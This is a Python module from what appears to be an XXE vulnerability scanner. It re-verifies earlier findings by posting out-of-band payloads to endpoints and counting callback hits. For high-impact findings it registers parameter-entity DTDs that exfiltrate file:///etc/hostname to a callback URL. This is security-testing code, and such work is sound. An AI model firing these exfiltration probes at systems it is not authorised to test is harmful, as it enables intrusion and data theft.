"""Feedback / regression loop.

After a scan, re-validates confirmed/probable findings with fresh canaries and
produces a regression summary. Also supports the `verify` CLI command against a
previously saved JSON result.
"""

from __future__ import annotations

import json
import os
import time
from typing import Dict, List, Optional

from .http import HttpClient
from .logger import get_logger
from .models import ScanConfig, ScanResult, new_id
from .oob import OOBServer, new_canary
from .payloads import dtd_payload, get_payload

log = get_logger()


class RegressionRunner:
    """Re-test the endpoints that produced findings with fresh canaries."""

    def __init__(self, cfg: ScanConfig, client: HttpClient, oob: OOBServer):
        self.cfg = cfg
        self.client = client
        self.oob = oob

    def verify_finding(self, finding, oob_base: str,
                       wait: Optional[float] = None) -> Dict:
        """Re-run an OOB payload against the finding's endpoint.

        settle window defaults to cfg.oob_wait (configurable via CLI/env).
        """
        cid = new_canary()
        kind = "oob_probe_http"
        # prefer parameter entity exfil if the original was file read
        if finding.impact and finding.impact.get("confidentiality") == "high":
            kind = "oob_parameter_entity"
        _, ctype, data = get_payload(kind, cid=cid, oob_base=oob_base)
        if kind == "oob_parameter_entity":
            self.oob.register_dtd(cid, dtd_payload(cid, oob_base,
                                                   "file:///etc/hostname",
                                                   php=False))
        status, body, headers, elapsed = self.client.post(
            finding.endpoint_url, data=data.encode("utf-8"),
            headers={"Content-Type": ctype}, allow_redirects=True)
        settle = wait if wait and wait > 0 else self.cfg.oob_wait
        time.sleep(max(0.0, settle))
        hits = self.oob.hits_for(cid)
        return {
            "finding_id": finding.id,
            "endpoint": finding.endpoint_url,
            "cve": finding.cve_id,
            "retest_kind": kind,
            "status": status,
            "oob_hits": len(hits),
            "verified": bool(hits),
        }


def run_regression(cfg: ScanConfig, client: HttpClient, oob: OOBServer,
                   findings: List, oob_base: str) -> Dict:
    runner = RegressionRunner(cfg, client, oob)
    results = []
    for f in findings:
        if f.confidence in ("confirmed", "probable"):
            results.append(runner.verify_finding(f, oob_base))
    verified = sum(1 for r in results if r["verified"])
    log.info(f"regression: {verified}/{len(results)} findings re-verified")
    return {"checked": results, "verified": verified, "total": len(results)}


def verify_from_json(json_path: str, cfg: ScanConfig,
                     oob_base: Optional[str] = None) -> Dict:
    """Verify a saved result file without rescanning.

    oob_base is the externally reachable OOB callback URL (e.g. a Cloudflare
    tunnel); falls back to localhost when not provided or when the tunnel is
    unavailable.
    """
    oob_base = oob_base or f"http://127.0.0.1:{cfg.oob_port}"
    with open(json_path, "r", encoding="utf-8") as f:
        data = json.load(f)
    findings = data.get("findings", [])
    if not findings:
        return {"results": [], "verified": 0, "total": 0}
    # one shared OOB server for all verifications: avoids bind races when
    # stop/start on the same port between findings and gives the parser
    # a stable callback URL across the whole run.
    oob = OOBServer(cfg.oob_port)
    if not oob.start():
        return {"results": [], "verified": 0, "total": 0,
                "error": "OOB server could not start"}
    client = HttpClient(cfg, headers=cfg.headers, cookies=cfg.cookies)
    out = []
    try:
        for f in findings:
            cid = new_canary()
            kind = "oob_probe_http"
            if (f.get("impact") or {}).get("confidentiality") == "high":
                kind = "oob_parameter_entity"
                oob.register_dtd(cid, dtd_payload(cid, oob_base,
                                                  "file:///etc/hostname",
                                                  php=False))
            _, ctype, data_ = get_payload(kind, cid=cid, oob_base=oob_base)
            try:
                status, body, headers, elapsed = client.post(
                    f.get("endpoint_url", ""), data=data_.encode("utf-8"),
                    headers={"Content-Type": ctype}, allow_redirects=True)
            except Exception as e:  # noqa: BLE001
                log.warn(f"verify request failed for {f.get('endpoint_url')}: {e}")
                status = 0
            time.sleep(max(0.0, cfg.oob_wait))
            hits = oob.hits_for(cid)
            out.append({
                "finding": f.get("cve_id") or f.get("title"),
                "endpoint": f.get("endpoint_url"),
                "verified": bool(hits),
                "oob_hits": len(hits),
                "status": status,
            })
    finally:
        client.close()
        oob.stop()
    verified = sum(1 for r in out if r["verified"])
    log.info(f"verify: {verified}/{len(out)} findings re-confirmed")
    return {"results": out, "verified": verified, "total": len(out)}




